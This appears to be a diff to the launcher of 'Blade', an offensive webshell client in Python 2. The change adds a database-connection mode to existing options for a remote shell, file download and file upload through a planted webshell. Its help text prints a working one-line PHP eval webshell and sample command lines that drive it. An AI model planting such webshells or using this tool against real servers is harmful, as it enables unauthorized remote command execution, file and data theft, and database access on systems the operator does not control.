@@ -6,6 +6,7 @@ from lib.core.connector import Connector
 from lib.core.webshellConnector import WebShellConnector
 from lib.core.pullConnector import PullConnector
 from lib.core.pushConnector import PushConnector
+from lib.core.databaseConnector import DatabaseConnector
 
 class Launcher(object):
     """The core class which start the whole app"""
@@ -15,11 +16,11 @@ class Launcher(object):
     # return: none
     @classmethod
     def main(self):
-        print '- Blade (development version)'
+        print '+ Blade (development version)'
         print '------------------------------------------------------------'
         config = self.getConfig()
         if self.configIsError(config):
-            print '+ Error: Parameters are not correct'
+            print '- Error: Parameters are not correct'
             print ''
             self.printHelp()
             return
@@ -39,6 +40,7 @@ class Launcher(object):
         print '  --shell    Get a web based shell on the console'
         print '  --pull+    Download file to local: -- pull remote_path local_path / --pull remote_path'
         print '  --push+    Upload a file from loacl: --push local_path remote_path'
+        print '  --db+      Connect to database: --db mysql'
         print ''
         print 'Examples for using:'
         print '  Get a shell:'
@@ -47,6 +49,8 @@ class Launcher(object):
         print '             -u http://localhost/shell.php -s php -p cmd --pull file1 file2'
         print '  Upload a file:'
         print '             -u http://localhost/shell.php -s php -p cmd --push file1 file2'
+        print '  Connect to database:'
+        print '             -u http://localhost/shell.php -s php -p cmd --db mysql'
         print ''
         print 'Webshell samples:'
         print '  PHP:       <?php @eval($_REQUEST[\'cmd\']);?>'
@@ -60,7 +64,7 @@ class Launcher(object):
     @classmethod
     def getConfig(self):
         try:
-            opts, args = getopt.getopt(sys.argv[1:], 'u:p:s:', ['shell', 'pull', 'push'])
+            opts, args = getopt.getopt(sys.argv[1:], 'u:p:s:', ['shell', 'pull', 'push', 'db'])
         except:
             return 'error'
         config = {
@@ -70,6 +74,7 @@ class Launcher(object):
             'shell': False,
             'pull': [],
             'push': [],
+            'database': ''
         }
         for option, value in opts:
             if option == '-u':
@@ -84,6 +89,8 @@ class Launcher(object):
                 config['pull'] = args
             elif option == '--push':
                 config['push'] = args
+            elif option == '--db':
+                config['database'] = args[0]
         return config
 
     # Check if the Json object config has any errors
@@ -96,15 +103,17 @@ class Launcher(object):
         else:
             if config['url'] == '' or config['password'] == '' or config['server'] == '':
                 return True
-            elif config['shell'] == True and len(config['pull']) == 0 and len(config['push']) == 0:
+            elif config['shell'] == True and len(config['pull']) == 0 and len(config['push']) == 0 and config['database'] == '':
                 return False
-            elif config['shell'] == False and len(config['pull']) == 2 and len(config['push']) == 0:
+            elif config['shell'] == False and len(config['pull']) == 2 and len(config['push']) == 0 and config['database'] == '':
                 return False
-            elif config['shell'] == False and len(config['pull']) == 1 and len(config['push']) == 0:
+            elif config['shell'] == False and len(config['pull']) == 1 and len(config['push']) == 0 and config['database'] == '':
                 return False
-            elif config['shell'] == False and len(config['pull']) == 0 and len(config['push']) == 2:
+            elif config['shell'] == False and len(config['pull']) == 0 and len(config['push']) == 2 and config['database'] == '':
                 return False
-            elif config['shell'] == False and len(config['pull']) == 0 and len(config['push']) == 0:
+            elif config['shell'] == False and len(config['pull']) == 0 and len(config['push']) == 1 and config['database'] == '':
+                return False
+            elif config['shell'] == False and len(config['pull']) == 0 and len(config['push']) == 0 and config['database'] != '':
                 return False
             else:
                 return True
@@ -120,6 +129,16 @@ class Launcher(object):
             connector = PullConnector(config['url'], config['password'], config['server'], config['pull'])
         elif len(config['push']) > 0:
             connector = PushConnector(config['url'], config['password'], config['server'], config['push'])
+        elif config['database'] == 'mysql' or config['database'] == 'sqlserver' or config['database'] == 'oracle' or config['database'] == 'access':
+            print '+ Enter database configuration'
+            host = raw_input('+ Database host: ')
+            userName = raw_input('+ User name: ')
+            password = raw_input('+ Password: ')
+            if config['database'] == 'oracle':
+                db = raw_input('+ Database name: ')
+                connector = DatabaseConnector(config['url'], config['password'], config['server'], config['database'], host, userName, password, db)
+            else:
+                connector = DatabaseConnector(config['url'], config['password'], config['server'], config['database'], host, userName, password)
         else:
             connector = Connector(config['url'], config['password'], config['server'])
         return connector
